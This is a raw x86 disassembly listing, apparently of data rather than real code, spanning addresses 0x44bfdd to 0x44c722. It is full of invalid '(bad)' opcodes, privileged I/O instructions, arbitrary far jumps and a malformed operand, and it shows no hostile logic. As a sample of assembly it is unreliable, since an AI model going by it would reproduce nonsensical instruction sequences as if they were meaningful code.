  44bfdd:	test   DWORD PTR [esi-0xac47754],ebp
  44bfe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bfe4:	jmp    0x44bfc5
  44bfe6:	imul   ebx
  44bfe8:	push   ebp
  44bfe9:	dec    eax
  44bfea:	lock cmp dl,BYTE PTR [edi+0x62c46b85]
  44bff1:	and    BYTE PTR [esi+0x6eef75bd],cl
  44bff7:	sti    
  44bff8:	inc    ebp
  44bff9:	js     0x44c06e
  44bffb:	adc    ebp,DWORD PTR [eax-0x46]
  44bffe:	or     eax,0x81a7b89
  44c003:	and    eax,0xd5450d15
  44c008:	sub    bl,BYTE PTR [ebx+0x2f]
  44c00b:	adc    BYTE PTR [esi-0x46bac385],al
  44c011:	inc    edi
  44c012:	sti    
  44c013:	jmp    0x44c003
  44c015:	mov    ch,0x22
  44c017:	cld    
  44c018:	xor    al,0xfc
  44c01a:	adc    BYTE PTR [ebx+0x5d801568],al
  44c020:	cmp    DWORD PTR [esi+0x244d341d],0x66
  44c027:	jnp    0x44c019
  44c029:	pop    ecx
  44c02a:	sbb    edi,DWORD PTR [edx+0x14260cf8]
  44c030:	mov    ch,0x1e
  44c032:	mov    edi,DWORD PTR [ebx-0x2edbfc53]
  44c038:	sub    ah,BYTE PTR [ebx-0x62]
  44c03b:	sub    DWORD PTR [edi-0x762bfb3e],esi
  44c041:	imul   ebx,DWORD PTR ds:0x1996dd9e,0x6f
  44c048:	push   es
  44c049:	adc    DWORD PTR [eax+eiz*4],ecx
  44c04c:	std    
  44c04d:	xchg   ecx,eax
  44c04e:	pusha  
  44c04f:	and    eax,0x4970e3ad
  44c054:	(bad)  
  44c055:	mov    cl,0xd2
  44c057:	xchg   ecx,eax
  44c058:	sbb    ch,al
  44c05a:	dec    esi
  44c05b:	pop    ss
  44c05c:	add    al,0xdf
  44c05e:	aaa    
  44c05f:	sbb    DWORD PTR [edi+0x4a18fd45],0x5ed48bfc
  44c069:	mov    ds:0x7c7c26ea,al
  44c06e:	push   ds
  44c06f:	cmp    al,0x9f
  44c071:	mov    eax,ds:0xf4ed32f3
  44c076:	pop    ds
  44c077:	ds xor al,0x52
  44c07a:	pusha  
  44c07b:	fisttp QWORD PTR [ecx-0x695fa23]
  44c081:	test   BYTE PTR [edx],ah
  44c083:	pop    eax
  44c084:	test   eax,0x8661c402
  44c089:	cmp    al,0xbb
  44c08b:	lock sahf 
  44c08d:	or     al,0x80
  44c08f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c090:	mov    DWORD PTR ds:0xa9fa75c9,eax
  44c096:	push   ebp
  44c097:	adc    al,0x34
  44c099:	add    al,BYTE PTR [eax]
  44c09b:	sbb    eax,0xb523b098
  44c0a0:	or     eax,0x8ba44f25
  44c0a5:	cmp    eax,DWORD PTR [ebp-0x3a480624]
  44c0ab:	mov    dh,0x11
  44c0ad:	fwait
  44c0ae:	mov    bh,0x5a
  44c0b0:	inc    eax
  44c0b1:	mov    al,ds:0xec0fcc60
  44c0b6:	in     eax,0x8
  44c0b8:	push   eax
  44c0b9:	ret    0xd798
  44c0bc:	push   0x3
  44c0be:	push   ss
  44c0bf:	js     0x44c0ad
  44c0c1:	inc    esi
  44c0c2:	pop    eax
  44c0c3:	leave  
  44c0c4:	mov    ds:0xdc7cd044,al
  44c0c9:	mov    dh,0x1c
  44c0cb:	shl    BYTE PTR [ecx-0x42],cl
  44c0ce:	out    dx,al
  44c0cf:	cmp    DWORD PTR [ecx+0x65],edi
  44c0d2:	call   0x60d5:0xaff7fe51
  44c0d9:	icebp  
  44c0da:	mov    edx,0x20c88234
  44c0df:	xlat   BYTE PTR ds:[ebx]
  44c0e0:	add    eax,0x9a224f0d
  44c0e5:	pop    ss
  44c0e6:	(bad)  
  44c0e7:	scas   al,BYTE PTR es:[edi]
  44c0e8:	mov    bh,bl
  44c0ea:	std    
  44c0eb:	fstp   DWORD PTR [esi-0x44a69052]
  44c0f1:	call   FWORD PTR [ecx-0x4fb9576c]
  44c0f7:	aad    0x90
  44c0f9:	and    BYTE PTR [ebp+edi*4-0x57],ah
  44c0fd:	arpl   WORD PTR [ebx],ax
  44c0ff:	in     eax,0x87
  44c101:	mov    ds:0x87560449,eax
  44c106:	pop    ds
  44c107:	push   edx
  44c108:	scas   eax,DWORD PTR es:[edi]
  44c109:	and    al,0x92
  44c10b:	xor    eax,0x4015ca1
  44c110:	in     al,dx
  44c111:	pop    esi
  44c112:	xchg   esi,eax
  44c113:	loope  0x44c189
  44c115:	daa    
  44c116:	scas   al,BYTE PTR es:[edi]
  44c117:	scas   eax,DWORD PTR es:[edi]
  44c118:	sar    BYTE PTR [ebx-0x62],cl
  44c11b:	mov    cl,0xd4
  44c11d:	dec    esp
  44c11e:	mov    al,ds:0x14e18995
  44c123:	sbb    BYTE PTR [ebp+0x1ba7641a],0x3
  44c12a:	jbe    0x44c18e
  44c12c:	fcmovnbe st,st(4)
  44c12e:	aam    0x4c
  44c130:	mov    bl,0xdb
  44c132:	pop    ds
  44c133:	lds    esi,FWORD PTR [edi-0x6da9a317]
  44c139:	jbe    0x44c1ac
  44c13b:	aam    0x71
  44c13d:	xchg   BYTE PTR [esi-0x37],bh
  44c140:	ins    DWORD PTR es:[edi],dx
  44c141:	or     edi,ebp
  44c143:	jbe    0x44c1b6
  44c145:	ficomp DWORD PTR [edi]
  44c147:	dec    ebx
  44c148:	inc    ecx
  44c149:	jge    0x44c176
  44c14b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c14c:	je     0x44c105
  44c14e:	mov    bl,BYTE PTR [esi-0x2aa03772]
  44c154:	jge    0x44c0e8
  44c156:	or     eax,0x1e6a6101
  44c15b:	jecxz  0x44c101
  44c15d:	loopne 0x44c15e
  44c15f:	push   ecx
  44c160:	lock xlat BYTE PTR fs:[ebx]
  44c163:	in     eax,dx
  44c164:	in     eax,dx
  44c165:	add    cl,BYTE PTR [eax-0x5]
  44c168:	push   es
  44c169:	add    ecx,ebp
  44c16b:	mov    bl,0xf5
  44c16d:	jge    0x44c1ec
  44c16f:	icebp  
  44c170:	nop
  44c171:	pop    esi
  44c172:	nop
  44c173:	adc    al,0xb3
  44c175:	ss hlt 
  44c177:	addr16 cmp al,0x1c
  44c17a:	call   0x671da4dd
  44c17f:	test   al,0x5a
  44c181:	cmp    DWORD PTR [ecx],ebx
  44c183:	aaa    
  44c184:	jl     0x44c14a
  44c186:	xor    ecx,DWORD PTR [edi-0x54a2f278]
  44c18c:	(bad)  
  44c18d:	icebp  
  44c18e:	or     BYTE PTR [eax-0x2d],cl
  44c191:	jae    0x44c165
  44c193:	fimul  DWORD PTR [eax-0x3dc311c5]
  44c199:	(bad)  
  44c19a:	xlat   BYTE PTR ds:[ebx]
  44c19b:	push   esp
  44c19c:	mov    BYTE PTR [ecx+0x3e],ah
  44c19f:	mov    al,ds:0x61ea13ad
  44c1a4:	cmp    eax,0xd57eb63c
  44c1a9:	add    bh,BYTE PTR [edx-0x1a]
  44c1ac:	ss std 
  44c1ae:	push   esp
  44c1af:	xor    BYTE PTR [eax+0x4a25ab61],cl
  44c1b5:	adc    BYTE PTR [ebx-0x27e2a9a7],al
  44c1bb:	jns    0x44c154
  44c1bd:	xchg   ebp,eax
  44c1be:	pop    ss
  44c1bf:	mov    edi,0x478b4af9
  44c1c4:	(bad)  
  44c1c5:	fistp  DWORD PTR ds:0x3041307a
  44c1cb:	push   edi
  44c1cc:	push   ebx
  44c1cd:	adc    DWORD PTR [ecx+0x579deb46],ecx
  44c1d3:	pop    ecx
  44c1d4:	inc    edi
  44c1d5:	add    dl,BYTE PTR [eax+0x74]
  44c1d8:	xor    al,0xdb
  44c1da:	xchg   esi,eax
  44c1db:	loop   0x44c166
  44c1dd:	add    ebx,DWORD PTR [ecx+0x2f0a4eb6]
  44c1e3:	jp     0x44c198
  44c1e5:	add    eax,0xbcae4e92
  44c1ea:	je     0x44c187
  44c1ec:	mov    bl,0x32
  44c1ee:	pop    ds
  44c1ef:	push   edi
  44c1f0:	xchg   esi,eax
  44c1f1:	push   0x75ae25ba
  44c1f6:	in     al,0xb2
  44c1f8:	ins    BYTE PTR es:[edi],dx
  44c1f9:	sbb    eax,0x2a9fd285
  44c1fe:	ds and al,0xd8
  44c201:	jmp    0x7757:0x5db7d311
  44c208:	xchg   edi,eax
  44c209:	icebp  
  44c20a:	cdq    
  44c20b:	ror    DWORD PTR [edx],cl
  44c20d:	xchg   edi,eax
  44c20e:	ins    DWORD PTR es:[edi],dx
  44c20f:	push   esp
  44c210:	(bad)  
  44c211:	loop   0x44c21f
  44c213:	iret   
  44c214:	xchg   edi,eax
  44c215:	push   es
  44c216:	aaa    
  44c217:	jl     0x44c227
  44c219:	and    bh,dh
  44c21b:	aam    0xc5
  44c21d:	fst    QWORD PTR [ecx-0x76]
  44c220:	arpl   WORD PTR ds:[edi],ax
  44c223:	(bad)  
  44c224:	mov    BYTE PTR [ebx],bl
  44c226:	sbb    al,0x86
  44c228:	neg    BYTE PTR [eax+0x38]
  44c22b:	mov    al,0xcd
  44c22d:	add    bl,BYTE PTR [ecx+eax*8]
  44c230:	mov    DWORD PTR [eax+0x63],esi
  44c233:	ret    
  44c234:	mov    al,0x8a
  44c236:	pusha  
  44c237:	mov    ebp,0xbd4bdbcd
  44c23c:	add    edx,DWORD PTR [eax+0x7355dc1b]
  44c242:	adc    ecx,eax
  44c244:	ins    BYTE PTR es:[edi],dx
  44c245:	sbb    al,0x78
  44c247:	cmp    DWORD PTR [ebx],edi
  44c249:	push   ss
  44c24a:	ja     0x44c2bb
  44c24c:	cmp    DWORD PTR [ecx],esp
  44c24e:	loopne 0x44c23f
  44c250:	mov    BYTE PTR [ecx+0x47],dl
  44c253:	mov    ebx,0x1a3f2417
  44c258:	enter  0x7402,0xe5
  44c25c:	sub    al,0x36
  44c25e:	dec    ebx
  44c25f:	mov    bl,0x66
  44c261:	lock ins DWORD PTR es:[edi],dx
  44c263:	sub    eax,DWORD PTR [edi-0x3e]
  44c266:	pop    es
  44c267:	sub    ecx,DWORD PTR [eax]
  44c269:	add    DWORD PTR [ecx],edi
  44c26b:	clc    
  44c26c:	je     0x44c26e
  44c26e:	out    dx,al
  44c26f:	jbe    0x44c23b
  44c271:	ins    DWORD PTR es:[edi],dx
  44c272:	xor    BYTE PTR [edx+0x55ea85fb],bh
  44c278:	mov    BYTE PTR [ecx-0x69],al
  44c27b:	ficomp DWORD PTR [eax-0x3c]
  44c27e:	gs jns 0x44c2cb
  44c281:	adc    eax,0x737515fc
  44c286:	outs   dx,BYTE PTR ds:[esi]
  44c287:	xor    eax,0x61d9ad5c
  44c28c:	xchg   DWORD PTR [ebp+0x1a0a9659],ebp
  44c292:	lahf   
  44c293:	push   ss
  44c294:	fiadd  WORD PTR [ebp-0x40]
  44c297:	aam    0x85
  44c299:	sbb    ah,al
  44c29b:	push   ebp
  44c29c:	inc    ebx
  44c29d:	(bad)  
  44c29e:	pusha  
  44c29f:	scas   al,BYTE PTR es:[edi]
  44c2a0:	test   DWORD PTR [ecx],ebp
  44c2a2:	out    dx,al
  44c2a3:	sub    ecx,esi
  44c2a5:	arpl   WORD PTR [ebx-0x2b],di
  44c2a8:	fs inc edx
  44c2aa:	pushf  
  44c2ab:	repz enter 0xb978,0x6e
  44c2b0:	mov    BYTE PTR [ebx-0x27],al
  44c2b3:	sub    bh,BYTE PTR [ecx]
  44c2b5:	fldenv cs:[ebp-0x2b5908e6]
  44c2bc:	imul   eax,DWORD PTR [eax+0x28],0xffffff94
  44c2c0:	ja     0x44c29b
  44c2c2:	pop    edx
  44c2c3:	imul   ecx,DWORD PTR [eax-0x18f963f7],0xffffffd6
  44c2ca:	into   
  44c2cb:	push   ds
  44c2cc:	and    BYTE PTR [edx+0x54],dh
  44c2cf:	shl    DWORD PTR [edx+0x6d57ace],0x3f
  44c2d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c2d7:	xchg   ebx,eax
  44c2d8:	repnz popa 
  44c2da:	push   ds
  44c2db:	retf   
  44c2dc:	mov    bl,0xc9
  44c2de:	icebp  
  44c2df:	(bad)  
  44c2e0:	xchg   edx,eax
  44c2e1:	or     cl,cl
  44c2e3:	aam    0xc2
  44c2e5:	in     eax,dx
  44c2e6:	and    dh,cl
  44c2e8:	jb     0x44c2bf
  44c2ea:	dec    esi
  44c2eb:	outs   dx,DWORD PTR ds:[esi]
  44c2ec:	dec    ecx
  44c2ed:	mov    edi,0x2ac4937d
  44c2f2:	lods   eax,DWORD PTR ds:[esi]
  44c2f3:	adc    eax,0xc0fa75c0
  44c2f8:	cmp    al,BYTE PTR [edx]
  44c2fa:	ins    BYTE PTR es:[edi],dx
  44c2fb:	rcl    edi,cl
  44c2fd:	fidivr DWORD PTR [edi]
  44c2ff:	int3   
  44c300:	jl     0x44c352
  44c302:	push   ds
  44c303:	dec    ebp
  44c304:	fdiv   DWORD PTR [esi+0x5e]
  44c307:	imul   ebp,DWORD PTR [ecx],0xffffffdd
  44c30a:	mov    al,ds:0x6e024bda
  44c30f:	vpor   ymm0,ymm6,YMMWORD PTR [ebp-0x26]
  44c314:	test   DWORD PTR [esi+0x2f],edx
  44c317:	scas   eax,DWORD PTR es:[edi]
  44c318:	mov    cl,al
  44c31a:	pushf  
  44c31b:	mov    cl,0x71
  44c31d:	pop    edi
  44c31e:	pop    ss
  44c31f:	(bad)  
  44c320:	jecxz  0x44c324
  44c322:	jbe    0x44c31c
  44c324:	ds or  eax,0xc2a46be6
  44c32a:	pusha  
  44c32b:	(bad)  
  44c32c:	jns    0x44c33e
  44c32e:	leave  
  44c32f:	pop    es
  44c330:	aam    0xdc
  44c332:	push   0x14ed1aa
  44c337:	mov    cl,0x1f
  44c339:	ret    
  44c33a:	bound  ecx,QWORD PTR [eax]
  44c33c:	dec    ebx
  44c33d:	pusha  
  44c33e:	pop    ds
  44c33f:	lea    esp,[eax-0x575a4c77]
  44c345:	push   esi
  44c346:	adc    edx,esp
  44c348:	ja     0x44c2f4
  44c34a:	and    edi,esp
  44c34c:	ret    
  44c34d:	mov    ch,0x67
  44c34f:	daa    
  44c350:	mov    bh,bh
  44c352:	sbb    ah,bl
  44c354:	cmp    ebx,DWORD PTR [edi+0x1f]
  44c357:	sahf   
  44c358:	bound  esp,QWORD PTR ds:0x93148170
  44c35e:	pusha  
  44c35f:	ja     0x44c36e
  44c361:	cmp    ch,bl
  44c363:	or     BYTE PTR [eax-0x7fe20397],cl
  44c369:	sbb    ebp,DWORD PTR [ebp+0x3805a9ca]
  44c36f:	xchg   ebp,eax
  44c370:	fcomi  st,st(1)
  44c372:	leave  
  44c373:	sti    
  44c374:	xchg   BYTE PTR [edx+0x7e],al
  44c377:	inc    eax
  44c378:	mov    al,BYTE PTR [ebp+0x470ebae4]
  44c37e:	inc    ecx
  44c37f:	or     BYTE PTR [eax+0x7f],dh
  44c382:	rol    DWORD PTR gs:[ebx-0x6b],cl
  44c386:	aam    0xa3
  44c388:	pop    edx
  44c389:	adc    DWORD PTR [ecx+0x11e24d10],esp
  44c38f:	inc    edi
  44c390:	mov    BYTE PTR [edi-0x3e],dl
  44c393:	mov    eax,0x1537f76
  44c398:	xor    al,0xf9
  44c39b:	aad    0xd2
  44c39d:	mov    ch,0x63
  44c39f:	jge    0x44c349
  44c3a1:	mov    al,0x3c
  44c3a3:	mov    DWORD PTR gs:[edi],ebp
  44c3a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c3a7:	or     al,0xf
  44c3a9:	mov    fs,WORD PTR [ecx-0x50]
  44c3ac:	or     al,bh
  44c3ae:	mov    edx,ebp
  44c3b0:	dec    ebp
  44c3b1:	sti    
  44c3b2:	sbb    DWORD PTR [eax],eax
  44c3b4:	dec    esp
  44c3b5:	add    al,0x92
  44c3b7:	jmp    0x44c33f
  44c3b9:	scas   eax,DWORD PTR es:[edi]
  44c3ba:	mov    dl,0xf7
  44c3bc:	or     DWORD PTR [ebp+0x11ee5a3f],ebx
  44c3c2:	(bad)  
  44c3c3:	aad    0x7f
  44c3c5:	out    0xab,al
  44c3c7:	aaa    
  44c3c8:	shr    DWORD PTR gs:[edx-0x74e07653],1
  44c3cf:	fdivr  DWORD PTR [edi-0x37]
  44c3d2:	mov    al,ds:0xe60230d7
  44c3d7:	mov    ebx,edx
  44c3d9:	(bad)  
  44c3da:	mov    ebx,0x1f92fcf2
  44c3df:	add    DWORD PTR [eax],ebp
  44c3e1:	loope  0x44c3bf
  44c3e3:	stos   DWORD PTR es:[edi],eax
  44c3e4:	xchg   esp,eax
  44c3e5:	jne    0x44c40b
  44c3e7:	mov    ch,0x8c
  44c3e9:	pop    ss
  44c3ea:	lods   eax,DWORD PTR ds:[esi]
  44c3eb:	pusha  
  44c3ec:	aad    0x31
  44c3ee:	xor    eax,0x60d589e3
  44c3f3:	inc    esi
  44c3f4:	aad    0x2a
  44c3f6:	or     BYTE PTR [eax],ch
  44c3f8:	mov    dl,cl
  44c3fa:	in     al,dx
  44c3fb:	dec    eax
  44c3fc:	push   ss
  44c3fd:	pop    es
  44c3fe:	xor    bh,BYTE PTR [ebp-0x69]
  44c401:	bound  ebx,QWORD PTR [ebp+0x1e145edf]
  44c407:	shl    DWORD PTR [eax+0x23],cl
  44c40a:	fs jmp 0x21613d98
  44c410:	lods   eax,DWORD PTR ds:[esi]
  44c411:	fimul  WORD PTR [ebx-0x60d134e]
  44c417:	mov    ebx,0xc80d058d
  44c41c:	mov    DWORD PTR [edi+0x4e],ebp
  44c41f:	rcr    ch,0x20
  44c422:	pop    ds
  44c423:	sbb    ebx,eax
  44c425:	jecxz  0x44c3ce
  44c427:	addr16 xor al,0xf7
  44c42a:	add    al,0xd4
  44c42c:	inc    eax
  44c42d:	inc    ebx
  44c42e:	mov    dh,0x8a
  44c430:	addr16 inc ebx
  44c432:	stos   DWORD PTR es:[edi],eax
  44c433:	dec    esi
  44c434:	call   0x4402:0xa3d3f93
  44c43b:	ret    0x8cd
  44c43e:	call   0xaa77:0x1f99cd58
  44c445:	mov    edx,0x5b94ec8d
  44c44a:	bound  ebx,QWORD PTR [edi]
  44c44c:	xor    eax,0xb7fab265
  44c451:	or     cl,0xcf
  44c454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c455:	add    bh,dl
  44c457:	cmp    BYTE PTR [edx],dh
  44c459:	mov    dl,0x5b
  44c45b:	bound  ebx,QWORD PTR [ebp-0x5f]
  44c45e:	pop    ds
  44c45f:	cmc    
  44c460:	dec    ecx
  44c461:	pop    ebx
  44c462:	mov    ebp,0xd607bc0e
  44c467:	aad    0xf
  44c469:	pop    eax
  44c46a:	das    
  44c46b:	xchg   ecx,eax
  44c46c:	mov    ?,WORD PTR [ecx]
  44c46e:	es clc 
  44c470:	data16 ins BYTE PTR es:[edi],dx
  44c472:	(bad)  
  44c473:	or     eax,0x6bff02b6
  44c478:	ss mov dh,dh
  44c47b:	aaa    
  44c47c:	jp     0x44c480
  44c47e:	xor    cl,dh
  44c480:	int3   
  44c481:	loop   0x44c45f
  44c483:	sub    BYTE PTR [esi+edx*8-0x56dbb0a0],dh
  44c48a:	xchg   ebx,eax
  44c48b:	pop    ss
  44c48c:	cmp    DWORD PTR [ebx],edx
  44c48e:	pop    edi
  44c48f:	outs   dx,BYTE PTR ds:[esi]
  44c490:	out    0xc4,al
  44c492:	ror    BYTE PTR [ebx-0x2916fa77],1
  44c498:	inc    ebp
  44c499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c49a:	push   ds
  44c49b:	and    al,0xbc
  44c49d:	clc    
  44c49e:	and    edx,edi
  44c4a0:	jp     0x44c423
  44c4a2:	(bad)  
  44c4a3:	or     DWORD PTR [ebx+0x31ed0eb7],edi
  44c4a9:	mov    dl,0x83
  44c4ab:	shr    DWORD PTR [ecx+0x50],0x64
  44c4af:	out    dx,eax
  44c4b0:	jle    0x44c4fb
  44c4b2:	pop    edi
  44c4b3:	jecxz  0x44c45c
  44c4b5:	ret    0x9394
  44c4b8:	popf   
  44c4b9:	add    eax,0xf90e46ec
  44c4be:	mov    edx,0x7ba58331
  44c4c3:	cmp    eax,0x6f7db11a
  44c4c8:	push   esi
  44c4c9:	dec    eax
  44c4ca:	in     al,dx
  44c4cb:	mov    BYTE PTR [edx+0x68c18303],cl
  44c4d1:	or     al,0x8e
  44c4d3:	aam    0xd5
  44c4d5:	mov    al,ds:0xcc8560ce
  44c4da:	(bad)  
  44c4db:	stos   DWORD PTR es:[edi],eax
  44c4dc:	push   0x3eef1075
  44c4e1:	stos   BYTE PTR es:[edi],al
  44c4e2:	(bad)  
  44c4e4:	mov    ch,BYTE PTR [ecx]
  44c4e6:	int    0xa5
  44c4e8:	fld    DWORD PTR [edi-0x29]
  44c4eb:	in     eax,dx
  44c4ec:	cmp    bl,ch
  44c4ee:	out    0x98,al
  44c4f0:	jp     0x44c53b
  44c4f2:	clc    
  44c4f3:	aad    0x94
  44c4f5:	ror    DWORD PTR [edi-0x76],0x9
  44c4f9:	sbb    al,0x1f
  44c4fb:	gs push 0xea5b18a6
  44c501:	xchg   esi,eax
  44c502:	adc    ah,dl
  44c504:	mov    ecx,0xe004131
  44c509:	ss cwde 
  44c50b:	jg     0x44c496
  44c50d:	dec    edi
  44c50e:	sbb    BYTE PTR [ecx+0x72],cl
  44c511:	fcom   QWORD PTR [ecx+0x26022d72]
  44c517:	mov    ah,0x10
  44c519:	and    bh,BYTE PTR [eax+edi*8]
  44c51c:	jo     0x44c567
  44c51e:	push   ds
  44c51f:	mov    cl,0xbd
  44c521:	scas   eax,DWORD PTR es:[edi]
  44c522:	or     BYTE PTR [edx+ebp*8],cl
  44c525:	aad    0x24
  44c527:	aam    0x44
  44c529:	inc    esi
  44c52a:	xchg   ecx,eax
  44c52b:	fist   DWORD PTR [ecx]
  44c52d:	enter  0x791a,0xf5
  44c531:	sar    DWORD PTR [eax+0x21cd57d4],0x81
  44c538:	push   cs
  44c539:	les    ebp,FWORD PTR [ecx-0x2c]
  44c53c:	fistp  WORD PTR [edi+0x4af871e2]
  44c542:	sti    
  44c543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c544:	adc    BYTE PTR [edx],al
  44c546:	adc    ebp,0xffffffdd
  44c549:	shl    al,0x58
  44c54c:	push   cs
  44c54d:	pop    esi
  44c54e:	das    
  44c54f:	xlat   BYTE PTR ds:[ebx]
  44c550:	cmp    eax,0x6e8eebca
  44c555:	pop    edx
  44c556:	and    al,BYTE PTR [ebp-0x78]
  44c559:	jns    0x44c58e
  44c55b:	xor    al,0x2c
  44c55d:	push   es
  44c55e:	mov    al,0x63
  44c560:	inc    ecx
  44c561:	add    cl,BYTE PTR [esi+0x5a]
  44c564:	popa   
  44c565:	xchg   ecx,eax
  44c566:	and    dh,dh
  44c568:	sahf   
  44c569:	in     eax,0x1f
  44c56b:	in     eax,dx
  44c56c:	in     al,dx
  44c56d:	sbb    DWORD PTR [esi+0x40],esp
  44c570:	cmp    al,0x65
  44c572:	jo     0x44c548
  44c574:	jl     0x44c512
  44c576:	mov    eax,ds:0x3fb43d3a
  44c57b:	shl    DWORD PTR [ecx+0x16a94b11],0x9b
  44c582:	sbb    al,0xd4
  44c584:	shr    DWORD PTR [ecx],0xed
  44c587:	loop   0x44c5c8
  44c589:	add    ch,BYTE PTR [edx+0x72d5f6a3]
  44c58f:	dec    ebx
  44c590:	adc    ecx,DWORD PTR [esi+0x7596500a]
  44c596:	jmp    0x70d1:0xea82f3c1
  44c59d:	xchg   ecx,eax
  44c59e:	ret    0x72d5
  44c5a1:	xchg   esp,eax
  44c5a2:	rol    DWORD PTR [ecx+0x4ba15548],cl
  44c5a8:	mov    bl,dh
  44c5aa:	adc    ebp,DWORD PTR [esi+0x3152968f]
  44c5b0:	jecxz  0x44c5a7
  44c5b2:	cmp    DWORD PTR [ebx+ebp*1],esp
  44c5b5:	(bad)  
  44c5b6:	fs pop ebx
  44c5b8:	adc    bh,cl
  44c5ba:	push   eax
  44c5bb:	mov    ebx,0x8bf96089
  44c5c0:	cmc    
  44c5c1:	or     al,dh
  44c5c3:	aad    0x65
  44c5c5:	sbb    DWORD PTR [esi+ebp*2+0x269f3a56],ebp
  44c5cc:	pop    eax
  44c5cd:	idiv   DWORD PTR [edi+edx*1]
  44c5d0:	fld    DWORD PTR ds:0x3d4df900
  44c5d6:	adc    DWORD PTR [eax-0x1ee1abd3],edx
  44c5dc:	adc    al,BYTE PTR [esi]
  44c5de:	or     dh,BYTE PTR [edx]
  44c5e0:	dec    eax
  44c5e1:	pop    ss
  44c5e2:	ds jecxz 0x44c631
  44c5e5:	add    al,dh
  44c5e7:	int    0xe4
  44c5e9:	cmp    dl,BYTE PTR [eax]
  44c5eb:	and    DWORD PTR [eax+0x2a],ebx
  44c5ee:	push   ds
  44c5ef:	imul   ebp,edx,0xffffff80
  44c5f2:	fincstp 
  44c5f4:	mov    esp,0x12d56b0a
  44c5f9:	mov    esp,DWORD PTR [ebx]
  44c5fb:	pop    ebx
  44c5fc:	adc    al,0x90
  44c5fe:	jae    0x44c5f1
  44c600:	mov    BYTE PTR [ecx+0x4c015c8f],ah
  44c606:	inc    edi
  44c607:	rcr    BYTE PTR [esi+0x37cdf805],1
  44c60d:	sahf   
  44c60e:	mov    ds:0x1f18c807,eax
  44c613:	or     ebx,ebp
  44c615:	shl    DWORD PTR [ebx-0x5caf2dae],1
  44c61b:	aam    0x9c
  44c61d:	mov    dl,0x7e
  44c61f:	and    al,BYTE PTR [esi]
  44c621:	xor    eax,0x7d8b4024
  44c626:	mov    esi,0xb62b241a
  44c62b:	mov    bl,0xe9
  44c62d:	jae    0x44c6aa
  44c62f:	inc    ebp
  44c630:	inc    eax
  44c631:	daa    
  44c632:	popa   
  44c633:	ins    DWORD PTR es:[edi],dx
  44c634:	cmp    ecx,DWORD PTR [ebx+ebp*4+0x60621e26]
  44c63b:	outs   dx,DWORD PTR ds:[esi]
  44c63c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c63d:	mov    DWORD PTR [ecx+esi*1],ecx
  44c640:	(bad)  
  44c641:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c642:	rcl    ecx,cl
  44c644:	(bad)  ds:0x269e8a7
  44c64a:	xchg   esi,eax
  44c64b:	xor    BYTE PTR ds:0xcdc9802c,ah
  44c651:	pop    ss
  44c652:	pop    ebx
  44c653:	mov    ebp,0xf6e0ea7c
  44c658:	pushf  
  44c659:	out    dx,eax
  44c65a:	fsubr  st(6),st
  44c65c:	push   0x2
  44c65e:	cli    
  44c65f:	xchg   esi,eax
  44c660:	adc    ecx,eax
  44c662:	mov    esi,0x1e19ac54
  44c667:	mov    DWORD PTR [edx-0x51],esi
  44c66a:	fstp   TBYTE PTR [edi-0x52e74308]
  44c670:	inc    edx
  44c671:	dec    esp
  44c672:	pop    esp
  44c673:	call   0xf9f6:0x909d57
  44c67a:	fcomp  st(3)
  44c67c:	xor    al,0x1c
  44c67e:	xor    dh,BYTE PTR [ecx]
  44c680:	sbb    al,0x30
  44c682:	call   0x57d9:0xf2d3c654
  44c689:	adc    al,0x34
  44c68b:	fdivr  QWORD PTR [ebp+0x6e]
  44c68e:	mov    ss,esp
  44c690:	pop    esp
  44c691:	adc    cl,BYTE PTR [eax]
  44c693:	scas   eax,DWORD PTR es:[edi]
  44c694:	mov    DWORD PTR [ebx-0x12],esp
  44c697:	and    ebx,ebx
  44c699:	pop    ebp
  44c69a:	sub    dh,BYTE PTR [eax]
  44c69c:	sbb    bh,bl
  44c69e:	fcom   st(3)
  44c6a0:	cwde   
  44c6a1:	pop    eax
  44c6a2:	or     eax,0x3ff03280
  44c6a7:	sbb    eax,0x8f1f814a
  44c6ac:	sub    esi,DWORD PTR ds:0xc091a079
  44c6b2:	mov    ebx,0x1f6c3f5f
  44c6b7:	adc    eax,0xa84722e6
  44c6bc:	jecxz  0x44c6d8
  44c6be:	push   ds
  44c6bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c6c0:	dec    ebp
  44c6c1:	pop    esp
  44c6c2:	dec    ecx
  44c6c3:	push   ss
  44c6c4:	adc    ch,BYTE PTR [edi+ecx*2]
  44c6c7:	icebp  
  44c6c8:	arpl   WORD PTR [edx],ax
  44c6ca:	(bad)  
  44c6cb:	mov    edi,0x6afcdd6b
  44c6d0:	sbb    cl,BYTE PTR [edx+0x1f]
  44c6d3:	in     eax,dx
  44c6d4:	js     0x44c69f
  44c6d6:	jp     0x44c757
  44c6d8:	sbb    al,0xe3
  44c6da:	adc    edi,edx
  44c6dc:	mov    eax,ds:0x87816baa
  44c6e1:	jbe    0x44c6a5
  44c6e3:	xchg   ebp,eax
  44c6e4:	cmp    BYTE PTR [eax+eiz*4-0xed4ef53],cl
  44c6eb:	sbb    cl,BYTE PTR [eax-0x35ed90d2]
  44c6f1:	add    al,BYTE PTR [edx]
  44c6f3:	mov    edi,0x60725232
  44c6f8:	sub    al,0x8f
  44c6fa:	outs   dx,BYTE PTR ds:[esi]
  44c6fb:	retf   
  44c6fc:	bound  edx,QWORD PTR [ecx+0x18]
  44c6ff:	jmp    0x5d1:0x32fa0da9
  44c706:	out    dx,al
  44c707:	fdiv   QWORD PTR [edi-0x74]
  44c70a:	repnz loopne 0x44c6f3
  44c70d:	test   DWORD PTR [eax-0x73],esp
  44c710:	dec    ebx
  44c711:	dec    esi
  44c712:	gs out 0xf8,al
  44c715:	(bad)  
  44c716:	sub    esp,edx
  44c718:	neg    DWORD PTR [ecx-0x1]
  44c71b:	fcomp  DWORD PTR [eax]
  44c71d:	lock call DWORD PTR [ebp+0x64]
  44c721:	ret    
  44c722:	pop    ds
